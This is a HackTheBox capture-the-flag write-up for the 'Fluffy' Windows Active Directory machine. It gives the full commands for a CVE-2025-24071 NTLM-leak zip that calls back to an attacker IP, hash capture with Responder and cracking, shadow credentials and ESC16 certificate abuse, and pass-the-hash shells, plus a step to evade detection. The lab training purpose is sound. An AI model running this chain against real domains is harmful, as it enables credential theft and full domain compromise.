---
title: "HTB - Fluffy (Easy | Windows | Active Directory)"
date: 2026-09-14 00:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, active-directory, windows, adcs, esc16, shadow-credentials, kerberos, ldap, responder, net-ntlmv2, hashcat, certipy, bloodhound, winrm, cve-2025-24071, smb]
image:
  path: /assets/img/fluffy.png
---

## **Recon**

```bash
sudo nmap -p- <target> -sSCV -vvv --min-rate 5000
```

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-09-06 12:20:15Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Environment Profile

**Domain:** fluffy.htb  
**DC Hostname:** DC01.fluffy.htb  
**SSL Certificate Issuer:** fluffy-DC01-CA (indicates Active Directory Certificate Services may be active)  
**Time Skew:** +7 hours (critical for Kerberos ticket validity)  
**SMB Signing:** Required (security hardening in place)

#### Initial Credentials

The engagement begins with valid credentials for the j.fleischman user:

```bash
Username: j.fleischman
Password: J0elTHEM4n1990!
```

### SMB Enumeration

Enumerate available SMB shares using the provided credentials:

```bash
nxc smb <target> --shares -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```

**Output:**

```
SMB         <target>    445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         <target>    445    DC01             [*] Enumerated shares
SMB         <target>    445    DC01             Share           Permissions     Remark
SMB         <target>    445    DC01             -----           -----------     ------
SMB         <target>    445    DC01             ADMIN$                          Remote Admin
SMB         <target>    445    DC01             C$                              Default share
SMB         <target>    445    DC01             IPC$            READ            Remote IPC
SMB         <target>    445    DC01             IT              READ,WRITE      
SMB         <target>    445    DC01             NETLOGON        READ            Logon server share 
SMB         <target>    445    DC01             SYSVOL          READ            Logon server share
```

#### Accessing the IT Share

Connect to the IT share and explore available files:

```bash
smbclient //<target>/IT -U j.fleischman
```

![](/assets/img/fluffy/Pasted_image_20260906063224.png)

Several files are discovered within the IT share. A PDF regarding system updates is found along with a KeePass folder. The KeePass folder does not contain a .kdbx file, but the update documentation becomes relevant for the exploitation phase.

![](/assets/img/fluffy/Pasted_image_20260906063729.png)

### BloodHound Data Collection

Collect Active Directory information for path analysis:

```bash
sudo bloodhound-python -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -c All -ns <target> --zip
```

The collected data is uploaded to BloodHound for analysis of potential privilege escalation paths and user relationships.

---

## **User**

### CVE-2025-24071 - Windows File Explorer NTLM Authentication Spoofing

A critical vulnerability exists in Windows Explorer's handling of maliciously crafted .library-ms files within archives. When extracted or interacted with, these files trigger NTLM authentication attempts to attacker-controlled responder servers.

#### Step 1: Generate Exploit Payload

Clone the CVE-2025-24071 exploitation repository:

```bash
git clone https://github.com/ThemeHackers/CVE-2025-24071.git
cd CVE-2025-24071
```

Create the malicious ZIP payload with a crafted .library-ms file:

```bash
python3 exploit.py -f malicious -i 10.10.17.167
```

![](/assets/img/fluffy/Pasted_image_20260906063915.png)

The exploit generates exploit.zip, containing a malicious .library-ms file configured to authenticate to the attacker's IP address.

#### Step 2: Upload to SMB Share

Place the exploit.zip file on the IT share:

```bash
smbclient //<target>/IT -U j.fleischman

smb: \> put exploit.zip
```

![](/assets/img/fluffy/Pasted_image_20260906063949.png)

#### Step 3: Capture NTLM Hash via Responder

Set up a responder listener to capture NTLM authentication attempts:

```bash
sudo responder -I tun0 -v
```

![](/assets/img/fluffy/Pasted_image_20260906064037.png)

When a domain user extracts or interacts with the exploit.zip file on their system, their NTLM credentials are captured by responder.

#### Step 4: Crack NTLM Hash

Use John the Ripper to crack the captured NTLM hash:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Output:**

```
prometheusx-303  (p.agila)
```

**Credentials Obtained:**

- **Username:** p.agila
- **Password:** prometheusx-303

### Shadow Credentials Attack - winrm_svc

BloodHound analysis reveals that p.agila has GenericAll privileges over the Service Accounts group. The Service Accounts group has GenericWrite on the winrm_svc user account.

![](/assets/img/fluffy/Pasted_image_20260906043327.png)

#### Step 1: Add p.agila to Service Accounts

Use BloodyAD to grant group membership:

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host dc01.fluffy.htb add groupMember 'Service Accounts' p.agila
```

With this membership, p.agila now inherits GenericWrite privileges on winrm_svc.

#### Step 2: Shadow Credentials Attack

Exploit the GenericWrite privilege to add shadow credentials (certificate-based authentication) to the winrm_svc account:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy-ad shadow auto \
  -u p.agila@fluffy.htb -p prometheusx-303 \
  -account winrm_svc
```

![](/assets/img/fluffy/Pasted_image_20260906050250.png)

The attack successfully adds a shadow credential to winrm_svc, extracting its NT hash:

**winrm_svc NT Hash:** `33bd09dcd697600edf6b3a7af4875767`

#### Step 3: WinRM Access

Authenticate as winrm_svc using the extracted NTLM hash:

```bash
evil-winrm -i <target> -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

An interactive PowerShell session is established with winrm_svc privileges. The user flag can now be retrieved:

```powershell
type C:\Users\winrm_svc\Desktop\user.txt
```

---

## **Root**

### Shadow Credentials Attack - ca_svc

BloodHound analysis reveals that the ca_svc account is a member of the Cert Publishers Group, which is associated with the Denied RODC Password Replication Group. This positioning suggests ca_svc has ADCS-related privileges.

![](/assets/img/fluffy/Pasted_image_20260906065343.png)

![](/assets/img/fluffy/Pasted_image_20260906065349.png)

#### Step 1: Shadow Credentials on ca_svc

Exploit the GenericWrite inherited from the Service Accounts group to add shadow credentials to ca_svc:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy-ad shadow auto \
  -u p.agila@fluffy.htb -p prometheusx-303 \
  -account ca_svc
```

![](/assets/img/fluffy/Pasted_image_20260906071152.png)

The attack extracts the ca_svc NT hash:

**ca_svc NT Hash:** `ca0f4f9e9eb8a092addf53bb03fc98c8`

### ADCS Vulnerability Enumeration

Use certipy-ad to identify vulnerable certificate templates:

```bash
certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

![](/assets/img/fluffy/Pasted_image_20260906065542.png)

**Findings:**

- Members of Cert Publishers can enroll in any certificate generated by the CA
- User template allows custom UPN specification
- ESC16 vulnerability is present

### ESC16 Exploitation - UPN Spoofing Attack

The ESC16 vulnerability (combined with ESC3) allows privilege escalation through User Principal Name (UPN) spoofing. By temporarily changing a controlled account's UPN to Administrator, requesting a certificate, then reverting the change, an Administrator certificate can be obtained.

#### Step 1: Read ca_svc Current Attributes

Query the current attributes of the ca_svc account:

```bash
certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
```

**Current UPN:** [ca_svc@fluffy.htb](mailto:ca_svc@fluffy.htb)

#### Step 2: Modify UPN to Administrator

Change the ca_svc UPN to Administrator:

```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
```

#### Step 3: Request Administrator Certificate

Request a User certificate while the UPN is set to Administrator:

```bash
certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip <target> -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

**Output:**

```
[*] Wrote certificate and private key to 'administrator.pfx'
```

A valid Administrator certificate is generated.

#### Step 4: Restore Original UPN

Restore the ca_svc UPN to its original value to avoid detection:

```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
```

#### Step 5: Authenticate as Administrator

Use the administrator.pfx certificate to obtain a Kerberos ticket and extract the Administrator NT hash:

```bash
faketime "$(ntpdate -q <target> | cut -d ' ' -f 1,2)" \
certipy-ad auth -dc-ip <target> -pfx administrator.pfx -u administrator -domain fluffy.htb
```

![](/assets/img/fluffy/Pasted_image_20260906071433.png)

**Administrator NT Hash:** Extracted from certificate-based authentication

#### Step 6: Administrator Access

Authenticate as Administrator using the extracted credentials:

```bash
evil-winrm -i <target> -u administrator -H [extracted_hash]
```

Full administrative access to the Domain Controller is achieved. The root flag can be retrieved:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

### Attack Chain Summary

1. **Recon:** Nmap identified Active Directory infrastructure; j.fleischman credentials validated; SMB enumeration revealed IT share
2. **NTLM Capture:** CVE-2025-24071 exploit uploaded to SMB share; domain user extracted; NTLM hash captured via responder
3. **Initial Access:** NTLM hash cracked to obtain p.agila credentials
4. **Privilege Escalation (User):** p.agila added to Service Accounts; shadow credentials attack on winrm_svc; WinRM shell obtained
5. **Privilege Escalation (Root):** Shadow credentials attack on ca_svc; ADCS enumeration identified ESC16; UPN spoofing exploited; Administrator certificate obtained
6. **Full Compromise:** Administrator access achieved via certificate-based authentication

---


